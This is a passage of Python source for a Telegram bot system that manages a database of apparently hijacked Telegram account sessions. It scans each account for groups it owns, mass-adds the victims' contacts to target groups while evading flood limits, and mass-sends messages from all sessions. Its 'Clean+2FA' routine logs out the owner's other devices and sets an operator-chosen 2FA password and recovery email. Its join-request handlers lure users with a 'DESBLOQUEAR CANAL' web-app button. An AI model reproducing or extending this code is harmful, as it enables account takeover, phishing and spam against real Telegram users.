        sem = asyncio.Semaphore(25)
        progress_lock = asyncio.Lock()

        async def _scan_one(s):
            async with sem:
                client = None
                try:
                    client = TelegramClient(StringSession(s['session_data']), API_ID, API_HASH)
                    await client.connect()
                    if not await client.is_user_authorized():
                        return
                    dialogs = await client.get_dialogs(limit=200)
                    for dlg in dialogs:
                        try:
                            ent = dlg.entity
                            if isinstance(ent, Channel):
                                if not (ent.creator or getattr(ent, 'admin_rights', None)):
                                    continue
                                membros = getattr(ent, 'participants_count', 0) or 0
                                tipo = "📢 Canal" if not ent.megagroup else "👥 Supergrupo"
                                role = "👑 Dono" if ent.creator else "🛡 Admin"
                                link = f"@{ent.username}" if getattr(ent, 'username', None) else ''
                                donos.append({
                                    'phone': s.get('phone', '?'),
                                    'user_id': s.get('user_id'),
                                    'titulo': ent.title,
                                    'membros': membros,
                                    'tipo': tipo,
                                    'role': role,
                                    'link': link,
                                })
                            elif isinstance(ent, Chat):
                                if not getattr(ent, 'creator', False) and not getattr(ent, 'admin_rights', None):
                                    continue
                                donos.append({
                                    'phone': s.get('phone', '?'),
                                    'user_id': s.get('user_id'),
                                    'titulo': ent.title,
                                    'membros': getattr(ent, 'participants_count', 0) or 0,
                                    'tipo': "👥 Grupo",
                                    'role': "👑 Dono" if getattr(ent,'creator',False) else "🛡 Admin",
                                    'link': '',
                                })
                        except Exception:
                            continue
                except Exception as e:
                    logger.warning(f"[DonosGrupo] Erro session {s.get('phone')}: {e}")
                finally:
                    if client:
                        try: await client.disconnect()
                        except: pass
                    async with progress_lock:
                        scanned['n'] += 1
                        n = scanned['n']
                    if n % 100 == 0 or n == total:
                        try:
                            await bot.send_message(admin_id, f"⏳ Progresso: {n}/{total} sessions ({len(donos)} grupos achados)")
                        except: pass

        await asyncio.gather(*[_scan_one(s) for s in sessions], return_exceptions=True)
        if not donos:
            await bot.send_message(admin_id, "👑 Nenhuma session encontrada como dona/admin de grupos ou canais.")
            return
        donos.sort(key=lambda d: d['membros'], reverse=True)
        linhas = [f"👑 *Sessions Donas/Admins de Grupos ({len(donos)})*\n_Ordenado por nº de membros (maior primeiro)_\n"]
        for i, d in enumerate(donos[:50], 1):
            link_txt = f" — {d['link']}" if d['link'] else ""
            linhas.append(f"{i}. {d['tipo']} *{d['titulo']}* — 👥 {d['membros']:,} membros{link_txt}\n   {d['role']} pela `{d['phone']}` (id:`{d['user_id']}`)")
        if len(donos) > 50:
            linhas.append(f"\n_... e mais {len(donos)-50}_")
        texto = "\n\n".join(linhas)
        for i in range(0, len(texto), 3500):
            try:
                await bot.send_message(admin_id, texto[i:i+3500], parse_mode="Markdown")
            except Exception as e:
                logger.error(f"[DonosGrupo] Erro enviando: {e}")
                await bot.send_message(admin_id, texto[i:i+3500])
    try:
        ensure_telethon_loop()
        future = asyncio.run_coroutine_threadsafe(_scan(), telethon_loop)
        future.result(timeout=3600)
    except Exception as e:
        logger.error(f"[DonosGrupo] Erro geral: {e}")

def _run_puxar_contatos(link, admin_id, bot_token):
    async def _puxar():
        from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
        from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
        from telethon.tl.functions.messages import AddChatUserRequest
        from telethon.tl.types import ChatInviteAlready, ChatInvite, InputPhoneContact, Chat, Channel
        from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently
        from telethon.tl.functions.contacts import GetContactsRequest
        from datetime import datetime, timezone, timedelta
        from telegram import Bot
        bot = Bot(token=bot_token)
        sessions = db.get_all_sessions()
        if not sessions:
            await bot.send_message(admin_id, "❌ Nenhuma session disponível.")
            return
        total_added = 0
        total_errors = 0
        ready_sessions = []
        preparing_done = False
        sessions_checked = 0

        def _is_recent(u):
            if not hasattr(u, 'status') or u.status is None:
                return False
            if isinstance(u.status, UserStatusOnline):
                return True
            if isinstance(u.status, UserStatusRecently):
                return True
            if isinstance(u.status, UserStatusOffline):
                cutoff = datetime.now(timezone.utc) - timedelta(hours=5)
                return u.status.was_online and u.status.was_online.replace(tzinfo=timezone.utc) > cutoff
            return False

        async def _prepare_sessions():
            nonlocal preparing_done, sessions_checked
            for sess in sessions:
                try:
                    client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
                    await client.connect()
                    if not await client.is_user_authorized():
                        await client.disconnect()
                        sessions_checked += 1
                        continue
                    if '/+' in link or '/joinchat/' in link:
                        hash_part = link.split('/+')[-1] if '/+' in link else link.split('/joinchat/')[-1]
                        hash_part = hash_part.strip().rstrip('/')
                        try:
                            check = await client(CheckChatInviteRequest(hash_part))
                            if isinstance(check, ChatInviteAlready):
                                group = check.chat
                            elif isinstance(check, ChatInvite):
                                result = await client(ImportChatInviteRequest(hash_part))
                                group = result.chats[0] if result.chats else None
                            else:
                                await client.disconnect()
                                sessions_checked += 1
                                continue
                        except Exception as e:
                            logger.warning(f"[Puxar] Sessão {sess.get('phone','?')} não entrou: {e}")
                            await client.disconnect()
                            sessions_checked += 1
                            continue
                    else:
                        username = link.split('t.me/')[-1].strip().rstrip('/')
                        try:
                            group = await client.get_entity(username)
                            try:
                                await client(JoinChannelRequest(group))
                            except:
                                pass
                        except Exception as e:
                            logger.warning(f"[Puxar] Sessão {sess.get('phone','?')} não encontrou grupo: {e}")
                            await client.disconnect()
                            sessions_checked += 1
                            continue
                    if not group:
                        await client.disconnect()
                        sessions_checked += 1
                        continue
                    contacts_result = await client(GetContactsRequest(hash=0))
                    all_users = [u for u in contacts_result.users if not u.bot and not u.deleted and not u.is_self]
                    if not all_users:
                        logger.info(f"[Puxar] Sessão {sess.get('phone','?')}: 0 contatos, buscando nos chats...")
                        seen_ids = set()
                        try:
                            async for dialog in client.iter_dialogs(limit=200):
                                if dialog.is_user and dialog.entity and not dialog.entity.bot and not dialog.entity.deleted:
                                    if dialog.entity.id not in seen_ids:
                                        seen_ids.add(dialog.entity.id)
                                        all_users.append(dialog.entity)
                        except Exception as e:
                            logger.warning(f"[Puxar] Erro buscando dialogs sessão {sess.get('phone','?')}: {e}")
                    users_list = [u for u in all_users if _is_recent(u)]
                    logger.info(f"[Puxar] Sessão {sess.get('phone','?')}: {len(users_list)} online/recentes de {len(all_users)} total")
                    sessions_checked += 1
                    if not users_list:
                        await client.disconnect()
                        continue
                    is_channel = isinstance(group, Channel)
                    ready_sessions.append({
                        'phone': sess.get('phone', '?'),
                        'client': client,
                        'group': group,
                        'group_id': group.id,
                        'is_channel': is_channel,
                        'users': users_list,
                        'index': 0,
                        'added': 0,
                        'stopped': False,
                    })
                    logger.info(f"[Puxar] Sessão {sess.get('phone','?')}: preparada ({len(users_list)} usuários) — já adicionando!")
                    await asyncio.sleep(random.uniform(1, 2))
                except Exception as e:
                    logger.error(f"[Puxar] Erro preparando sessão {sess.get('phone','?')}: {e}")
                    sessions_checked += 1
            preparing_done = True
            logger.info(f"[Puxar] Preparação concluída: {len(ready_sessions)} sessões prontas de {len(sessions)} verificadas")

        async def _add_loop():
            nonlocal total_added, total_errors
            notified = False
            while True:
                if not ready_sessions:
                    if preparing_done:
                        break
                    await asyncio.sleep(2)
                    continue
                if not notified:
                    notified = True
                    await bot.send_message(
                        admin_id,
                        f"👥 **Rodízio iniciado!**\n🟢 Apenas online/vistos nas últimas 5h\n⏳ ~30s entre adições",
                        parse_mode="Markdown"
                    )
                active = [s for s in ready_sessions if not s['stopped'] and s['index'] < len(s['users'])]
                if not active:
                    if preparing_done:
                        break
                    await asyncio.sleep(3)
                    continue
                for s in active:
                    if s['stopped'] or s['index'] >= len(s['users']):
                        continue
                    user = s['users'][s['index']]
                    s['index'] += 1
                    try:
                        if s['is_channel']:
                            await s['client'](InviteToChannelRequest(s['group'], [user]))
                        else:
                            await s['client'](AddChatUserRequest(s['group_id'], user, fwd_limit=50))
                        s['added'] += 1
                        total_added += 1
                        logger.info(f"[Puxar] Sessão {s['phone']}: +1 adicionado (total sessão: {s['added']}, geral: {total_added})")
                    except FloodWaitError as e:
                        wait = min(e.seconds, 300)
                        logger.warning(f"[Puxar] FloodWait {wait}s sessão {s['phone']}")
                        await asyncio.sleep(wait + 5)
                    except Exception as e:
                        err = str(e).lower()
                        if 'peer_flood' in err:
                            logger.warning(f"[Puxar] PeerFlood sessão {s['phone']}, parando")
                            s['stopped'] = True
                        elif 'chat_admin_required' in err or 'chat_write_forbidden' in err:
                            logger.warning(f"[Puxar] Sessão {s['phone']} sem permissão, parando")
                            s['stopped'] = True
                        elif 'user_privacy' in err or 'user_not_mutual' in err or 'user_already_participant' in err or 'user_channels_too_much' in err or 'inputpeer' in err or 'inputchannel' in err:
                            pass
                        else:
                            logger.warning(f"[Puxar] Erro sessão {s['phone']} user {getattr(user,'id','?')}: {e}")
                            total_errors += 1
                    await asyncio.sleep(random.uniform(25, 35))

        prep_task = asyncio.create_task(_prepare_sessions())
        add_task = asyncio.create_task(_add_loop())
        await asyncio.gather(prep_task, add_task)

        for s in ready_sessions:
            try:
                await s['client'].disconnect()
            except:
                pass

        sessions_used = len([s for s in ready_sessions if s['added'] > 0])
        await bot.send_message(
            admin_id,
            f"✅ **Puxar Contatos Concluído!**\n\n"
            f"📁 Sessions prontas: {len(ready_sessions)}/{sessions_checked} verificadas\n"
            f"👥 Contatos adicionados: {total_added}\n"
            f"❌ Erros: {total_errors}",
            parse_mode="Markdown"
        )
    asyncio.run(_puxar())

pending_2fa_codes = {}

def _find_session_by_id_or_phone(consulta):
    consulta = consulta.strip()
    sess = None
    try:
        sess = db.get_session(int(consulta))
    except ValueError:
        sess = None
    if not sess:
        tel = consulta.lstrip('+').strip()
        for s in (db.get_all_sessions() or []):
            tel_db = str(s.get('phone', '')).lstrip('+').strip()
            if tel_db and (tel_db == tel or tel in tel_db or tel_db in tel):
                sess = s
                break
    return sess

def _notify_admin(bot_token, chat_id, text, parse_mode=None):
    try:
        body = {'chat_id': chat_id, 'text': text}
        if parse_mode:
            body['parse_mode'] = parse_mode
        http_requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=body, timeout=10)
    except Exception:
        pass

def _run_clean_and_2fa(session_uid, password, email, admin_id, bot_token):
    async def _doit():
        from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
        sess = db.get_session(session_uid)
        if not sess:
            _notify_admin(bot_token, admin_id, "❌ Session não encontrada.")
            return
        client = TelegramClient(StringSession(sess['session_data']), API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                _notify_admin(bot_token, admin_id, "❌ Session inválida ou desautorizada.")
                return
            auths = await client(GetAuthorizationsRequest())
            kept_info = None
            removed = 0
            failed = 0
            for a in auths.authorizations:
                region = (getattr(a, 'region', '') or '').lower()
                country = (getattr(a, 'country', '') or '').lower()
                if a.current or 'venda nova' in region or 'venda nova' in country:
                    kept_info = f"{a.device_model} | {a.region or '?'} ({a.country or '?'})"
                    continue
                try:
                    await client(ResetAuthorizationRequest(hash=a.hash))
                    removed += 1
                except Exception as e:
                    logger.warning(f"[Clean+2FA] falha reset hash={a.hash}: {e}")
                    failed += 1
            _notify_admin(
                bot_token, admin_id,
                f"🧹 *Devices limpos!*\n\n✅ Removidos: {removed}\n❌ Falhas: {failed}\n📍 Mantido: {kept_info or '(nenhum reconhecido)'}\n\n🔐 Ativando 2FA agora...",
                parse_mode="Markdown"
            )
            loop = asyncio.get_event_loop()
            future = loop.create_future()
            pending_2fa_codes[session_uid] = future

            async def _email_code_cb(code_length):
                _notify_admin(
                    bot_token, admin_id,
                    f"📩 *Telegram enviou um código de {code_length} dígitos no email.*\n\nMe manda o código aqui no chat:",
                    parse_mode="Markdown"
                )
                db.set_awaiting(admin_id, {'type': '2fa_email_code', 'session_user_id': session_uid})
                code = await asyncio.wait_for(future, timeout=600)
                return code

            await client.edit_2fa(new_password=password, email=email, email_code_callback=_email_code_cb)
            _notify_admin(bot_token, admin_id, "✅ *2FA ativado com sucesso!*", parse_mode="Markdown")
        except asyncio.TimeoutError:
            _notify_admin(bot_token, admin_id, "⏰ Tempo esgotado esperando o código do email (10min).")
        except Exception as e:
            logger.error(f"[Clean+2FA] erro: {e}")
            _notify_admin(bot_token, admin_id, f"❌ Erro: {e}")
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
            pending_2fa_codes.pop(session_uid, None)

    ensure_telethon_loop()
    asyncio.run_coroutine_threadsafe(_doit(), telethon_loop)

async def pai_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        return
    input_data = db.get_awaiting(user.id)
    if not input_data:
        return
    text = update.message.text
    input_type = input_data['type']

    if input_type == 'clean_devices_id':
        db.del_awaiting(user.id)
        sess = _find_session_by_id_or_phone(text)
        if not sess:
            await update.message.reply_text(f"❌ Nenhuma session com `{text.strip()}`.", parse_mode="Markdown")
            return
        db.set_awaiting(user.id, {'type': '2fa_password', 'session_user_id': sess['user_id']})
        await update.message.reply_text(
            f"✅ Session: `{sess.get('phone','?')}`\n\n🔐 Agora envie a *senha 2FA* que você quer cadastrar:",
            parse_mode="Markdown"
        )
        return

    if input_type == '2fa_password':
        sess_uid = input_data.get('session_user_id')
        db.set_awaiting(user.id, {'type': '2fa_email', 'session_user_id': sess_uid, 'password': text})
        await update.message.reply_text("📧 Agora envie o *email* pra recuperação:", parse_mode="Markdown")
        return

    if input_type == '2fa_email':
        sess_uid = input_data.get('session_user_id')
        password = input_data.get('password', '')
        db.del_awaiting(user.id)
        await update.message.reply_text("⚙️ Limpando devices e ativando 2FA... Aguarde.")
        threading.Thread(
            target=_run_clean_and_2fa,
            args=(sess_uid, password, text.strip(), user.id, context.bot.token),
            daemon=True
        ).start()
        return

    if input_type == '2fa_email_code':
        sess_uid = input_data.get('session_user_id')
        db.del_awaiting(user.id)
        fut = pending_2fa_codes.get(sess_uid)
        if fut and not fut.done():
            fut.get_loop().call_soon_threadsafe(fut.set_result, text.strip())
            await update.message.reply_text("✅ Código recebido, finalizando 2FA...")
        else:
            await update.message.reply_text("⚠️ Não há código pendente esperando.")
        return

    if input_type == 'ls_search_id':
        db.del_awaiting(user.id)
        consulta = text.strip()
        sess = None
        try:
            uid_int = int(consulta)
            sess = db.get_session(uid_int)
        except ValueError:
            sess = None
        if not sess:
            tel = consulta.lstrip('+').strip()
            todas = db.get_all_sessions() or []
            for s in todas:
                tel_db = str(s.get('phone', '')).lstrip('+').strip()
                if tel_db and (tel_db == tel or tel in tel_db or tel_db in tel):
                    sess = s
                    break
        if not sess:
            kb = [
                [InlineKeyboardButton("🔍 Tentar Outro", callback_data="ls_search")],
                [InlineKeyboardButton("⬅️ Voltar", callback_data="login_session")],
            ]
            await update.message.reply_text(
                f"❌ Nenhuma session encontrada com `{consulta}`.",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
            return
        target_uid = sess.get('user_id', '?')
        phone = sess.get('phone', 'Sem número')
        kb = [
            [InlineKeyboardButton("📲 Pedir Código de Login", callback_data=f"ls_reqcode_{target_uid}")],
            [InlineKeyboardButton("🔌 Desconectar Session", callback_data=f"ls_disconnect_{target_uid}")],
            [InlineKeyboardButton("🔍 Buscar Outro", callback_data="ls_search")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="login_session")],
        ]
        await update.message.reply_text(
            f"🔑 **Session Encontrada**\n\n📱 Número: `{phone}`\n🆔 User ID: `{target_uid}`\n\nEscolha uma ação:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
        return

    if input_type == 'puxar_contatos_link':
        db.del_awaiting(user.id)
        link = text.strip()
        if 't.me/' not in link:
            await update.message.reply_text("❌ Link inválido! Envie um link do Telegram.")
            return
        await update.message.reply_text("👥 Iniciando... Isso pode levar alguns minutos.")
        threading.Thread(target=_run_puxar_contatos, args=(link, user.id, context.bot.token), daemon=True).start()
        return

    if input_type == 'redirect_url':
        db.del_awaiting(user.id)
        tg_url = text.strip()
        if not tg_url.startswith("https://t.me/") and not tg_url.startswith("t.me/"):
            await update.message.reply_text("❌ URL inválida! Envie um link do Telegram (https://t.me/...)")
            return
        if not tg_url.startswith("https://"):
            tg_url = "https://" + tg_url
        import string
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        label = input_data.get('label', '')
        db.save_redirect(code, tg_url, label)
        base_url = os.getenv("WEBAPP_URL", "").rstrip("/")
        redirect_url = f"{base_url}/r/{code}"
        await update.message.reply_text(
            f"✅ **Link criado!**\n\n"
            f"🔗 Link: `{redirect_url}`\n"
            f"📱 Destino: {tg_url}\n"
            f"📝 Nome: {label or 'Sem nome'}\n\n"
            f"Compartilhe o link acima. Quem clicar será redirecionado para o Telegram.",
            parse_mode="Markdown"
        )
        await pai_admin_menu(update, context)
        return

    if input_type == 'redirect_label':
        label = text.strip()
        db.set_awaiting(user.id, {'type': 'redirect_url', 'label': label})
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await update.message.reply_text(
            "🔗 Agora envie o **link do Telegram** (canal/grupo):\n\nExemplo: `https://t.me/seucanalaqui`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
        return

    if input_type == 'bot_token':
        db.del_awaiting(user.id)
        try:
            resp = http_requests.get(f"https://api.telegram.org/bot{text}/getMe", timeout=10)
            if resp.status_code != 200:
                await update.message.reply_text("❌ Token inválido!")
                return
            bot_info = resp.json().get('result', {})
            bot_name = bot_info.get('first_name', 'Bot')
            new_id = db.add_bot(text, bot_name, API_ID, API_HASH, WEBAPP_URL, bot_type="miniapp")
            if new_id:
                await update.message.reply_text(f"✅ Bot **{bot_name}** adicionado!\n\nIniciando...", parse_mode="Markdown")
                bot_data = db.get_bot(new_id)
                if bot_data:
                    start_single_child_bot(bot_data)
                    await update.message.reply_text(f"✅ Bot **{bot_name}** está rodando!", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Erro ao salvar bot.")
        except Exception as e:
            await update.message.reply_text(f"❌ Erro: {e}")
        await pai_admin_menu(update, context)
        return

    if input_type == 'chatflow_token':
        db.del_awaiting(user.id)
        try:
            resp = http_requests.get(f"https://api.telegram.org/bot{text}/getMe", timeout=10)
            if resp.status_code != 200:
                await update.message.reply_text("❌ Token inválido!")
                return
            bot_info = resp.json().get('result', {})
            bot_name = bot_info.get('first_name', 'Bot')
            new_id = db.add_bot(text, bot_name, API_ID, API_HASH, "", bot_type="chatflow")
            if new_id:
                await update.message.reply_text(f"💬 Bot Fluxo Chat **{bot_name}** adicionado!\n\nIniciando...", parse_mode="Markdown")
                bot_data = db.get_bot(new_id)
                if bot_data:
                    start_single_child_bot(bot_data)
                    await update.message.reply_text(f"✅ Bot **{bot_name}** está rodando!", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Erro ao salvar bot.")
        except Exception as e:
            await update.message.reply_text(f"❌ Erro: {e}")
        await pai_admin_menu(update, context)
        return

    if input_type == 'approver_token':
        db.del_awaiting(user.id)
        try:
            resp = http_requests.get(f"https://api.telegram.org/bot{text}/getMe", timeout=10)
            if resp.status_code != 200:
                await update.message.reply_text("❌ Token inválido!")
                return
            bot_info = resp.json().get('result', {})
            bot_name = bot_info.get('first_name', 'Bot')
            new_id = db.add_bot(text, bot_name, API_ID, API_HASH, "", bot_type="approver")
            if new_id:
                await update.message.reply_text(f"✅ Bot Aprovador **{bot_name}** adicionado!\n\nIniciando...", parse_mode="Markdown")
                bot_data = db.get_bot(new_id)
                if bot_data:
                    start_single_child_bot(bot_data)
                    await update.message.reply_text(
                        f"✅ Bot **{bot_name}** está rodando!\n\n"
                        f"Adicione ele como admin nos seus grupos com permissão de convidar membros.\n"
                        f"Ele vai aceitar os pedidos automaticamente após 5 minutos.",
                        parse_mode="Markdown"
                    )
            else:
                await update.message.reply_text("❌ Erro ao salvar bot.")
        except Exception as e:
            await update.message.reply_text(f"❌ Erro: {e}")
        await pai_admin_menu(update, context)
        return

    config = load_config()
    if input_type == 'intervalo_horas':
        try:
            val = max(1, int(text))
            config['intervalo_horas'] = str(val)
        except:
            await update.message.reply_text("❌ Número inválido!")
            return
    else:
        config[input_type] = text
    save_config(config)
    db.del_awaiting(user.id)
    await update.message.reply_text("✅ Atualizado!")
    await pai_admin_menu(update, context)

async def pai_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    jr = update.chat_join_request
    user = jr.from_user
    chat = jr.chat
    pending = load_pending()
    pending[str(user.id)] = {'chat_id': chat.id, 'chat_title': chat.title, 'timestamp': datetime.now().isoformat()}
    save_pending(pending)
    config = load_config()
    keyboard = [[InlineKeyboardButton(config.get('botao', "🔓 DESBLOQUEAR CANAL"), web_app=WebAppInfo(url=WEBAPP_URL), api_kwargs={"style": "success"})]]
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.").replace("{chat_title}", chat.title)
    try:
        await context.bot.send_message(chat_id=user.id, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Erro join request: {e}")


async def child_cmd_setdisparo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    bot_id = context.bot_data.get('bot_id')
    bot_name = context.bot_data.get('bot_name', 'Bot Filho')
    msg = ' '.join(context.args) if context.args else ''
    if not msg:
        config = get_bot_cfg(bot_id)
        atual = config.get('msg_disparo', '(vazia)')
        await update.message.reply_text(f"ℹ️ Uso: /setdisparo <mensagem>\n\nAtual ({bot_name}):\n{atual}")
        return
    db.set_bot_config(bot_id, 'msg_disparo', msg)
    await update.message.reply_text(f"✅ Msg disparo de *{bot_name}* atualizada:\n\n{msg}", parse_mode="Markdown")

async def child_cmd_setintervalo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    bot_id = context.bot_data.get('bot_id')
    bot_name = context.bot_data.get('bot_name', 'Bot Filho')
    if not context.args or not context.args[0].isdigit():
        config = get_bot_cfg(bot_id)
        await update.message.reply_text(f"ℹ️ Uso: /setintervalo <horas>\n\nAtual ({bot_name}): {config.get('intervalo_horas', '1')}h")
        return
    val = int(context.args[0])
    if val < 1:
        await update.message.reply_text("❌ Mínimo 1 hora.")
        return
    db.set_bot_config(bot_id, 'intervalo_horas', str(val))
    await update.message.reply_text(f"✅ Intervalo de *{bot_name}* atualizado para {val}h.", parse_mode="Markdown")

async def child_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_admin(user.id):
        await child_admin_menu(update, context)
        return
    bot_id = context.bot_data.get('bot_id')
    config = get_bot_cfg(bot_id)
    webapp_url = get_child_webapp_url(bot_id)
    keyboard = [[InlineKeyboardButton(config.get('botao', "🔓 DESBLOQUEAR CANAL"), web_app=WebAppInfo(url=webapp_url), api_kwargs={"style": "success"})]]
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.").replace("{chat_title}", "o canal")
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def child_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_id = context.bot_data.get('bot_id')
    bot_name = context.bot_data.get('bot_name', 'Bot Filho')
    config = get_bot_cfg(bot_id)
    my = db.count_sessions_by_bot(bot_id)
    total = db.count_sessions()
    intervalo = config.get('intervalo_horas', '1')
    keyboard = [
        [InlineKeyboardButton("📊 Estatísticas", callback_data="c_stats")],
        [InlineKeyboardButton("📁 Minhas Sessions", callback_data="c_my_sessions")],
        [InlineKeyboardButton("📁 Todas Sessions", callback_data="c_all_sessions")],
        [InlineKeyboardButton("🔥 Msg Disparo", callback_data="c_edit_disparo")],
        [InlineKeyboardButton("🧹 Limpar Msg Disparo", callback_data="c_clear_disparo")],
        [InlineKeyboardButton(f"⏰ Intervalo ({intervalo}h)", callback_data="c_edit_intervalo")],
        [InlineKeyboardButton("🚀 Disparar TODAS", callback_data="c_disparar")],
        [InlineKeyboardButton("✏️ Msg Inicial", callback_data="c_edit_msg")],
        [InlineKeyboardButton("🔘 Texto Botão", callback_data="c_edit_btn")],
    ]
    text = f"🔧 **Painel Admin - {bot_name}**\n\n📁 Minhas Sessions: {my}\n📁 Total: {total}"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def child_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data or ''
    if data.startswith("cf_"):
        await _handle_code_keyboard(update, context)
        return
    try:
        await query.answer()
    except Exception:
        pass
    if not is_admin(query.from_user.id):
        return
    data = query.data
    bot_id = context.bot_data.get('bot_id')
    bot_name = context.bot_data.get('bot_name', 'Bot')
    config = get_bot_cfg(bot_id)

    try:
        await _child_callback_inner(update, query, context, data, bot_id, bot_name, config)
    except Exception as e:
        err_msg = str(e)
        if "Peer_flood" in err_msg or "PEER_FLOOD" in err_msg:
            logger.warning(f"⚠️ Peer_flood no bot {bot_name}, tentando via Bot Pai...")
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                http_requests.post(url, json={
                    'chat_id': ADMIN_ID,
                    'text': f"⚠️ Bot **{bot_name}** está com Peer_flood do Telegram.\n\nO bot mandou muitas mensagens e foi temporariamente bloqueado.\nAguarde alguns minutos e tente novamente.",
                    'parse_mode': 'Markdown'
                }, timeout=5)
            except:
                pass
        else:
            logger.error(f"Erro child_callback {bot_name}: {e}")

async def _child_callback_inner(update, query, context, data, bot_id, bot_name, config):
    if data == "c_menu":
        await child_admin_menu(update, context)
    elif data == "c_stats":
        my = db.count_sessions_by_bot(bot_id)
        total = db.count_sessions()
        text = f"📊 **Estatísticas**\n\n📁 Minhas: {my}\n📁 Total: {total}"
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "c_my_sessions":
        sessions = db.get_sessions_by_bot(bot_id)
        text = "📁 Nenhuma session." if not sessions else f"📁 **Minhas Sessions ({len(sessions)})**\n\n" + "".join(f"• {s['phone'] or s['user_id']}\n" for s in sessions[:20])
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "c_all_sessions":
        sessions = db.get_all_sessions()
        text = "📁 Nenhuma session." if not sessions else f"📁 **Todas Sessions ({len(sessions)})**\n\n" + "".join(f"• {s['phone'] or s['user_id']}\n" for s in sessions[:20])
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "c_edit_disparo":
        db.set_awaiting(query.from_user.id, {'type': 'msg_disparo', 'bot_id': bot_id})
        text = f"🔥 Envie a nova mensagem de disparo.\n\nAtual:\n{config.get('msg_disparo', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "c_clear_disparo":
        db.set_bot_config(bot_id, 'msg_disparo', '')
        text = "🧹 *Mensagem de disparo limpa!*\n\nO bot não vai mais disparar até você configurar uma nova msg."
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif data == "c_edit_intervalo":
        db.set_awaiting(query.from_user.id, {'type': 'intervalo_horas', 'bot_id': bot_id})
        text = f"⏰ Envie o intervalo em horas.\n\nAtual: {config.get('intervalo_horas', '1')}h"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "c_edit_msg":
        db.set_awaiting(query.from_user.id, {'type': 'mensagem', 'bot_id': bot_id})
        text = "✏️ Envie a nova mensagem inicial.\nUse {chat_title} para o nome do grupo."
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "c_edit_btn":
        db.set_awaiting(query.from_user.id, {'type': 'botao', 'bot_id': bot_id})
        text = f"🔘 Envie o novo texto do botão.\n\nAtual: {config.get('botao', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="c_menu")]]
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(kb))
    elif data == "c_disparar":
        total = db.count_sessions()
        if total == 0:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
            await safe_edit(query, "❌ Nenhuma session!", reply_markup=InlineKeyboardMarkup(kb))
            return
        await safe_edit(query, f"🚀 Disparando em {total} sessions...")
        asyncio.create_task(disparo_job(context))
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="c_menu")]]
        await safe_edit(query, "🚀 Disparo iniciado!", reply_markup=InlineKeyboardMarkup(kb))

async def child_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        return
    input_data = db.get_awaiting(user.id)
    if not input_data:
        return
    text = update.message.text
    input_type = input_data['type']
    bot_id = input_data.get('bot_id')

    if bot_id:
        if input_type == 'intervalo_horas':
            try:
                val = max(1, int(text))
                db.set_bot_config(bot_id, 'intervalo_horas', str(val))
            except:
                await update.message.reply_text("❌ Número inválido!")
                return
        else:
            db.set_bot_config(bot_id, input_type, text)

    db.del_awaiting(user.id)
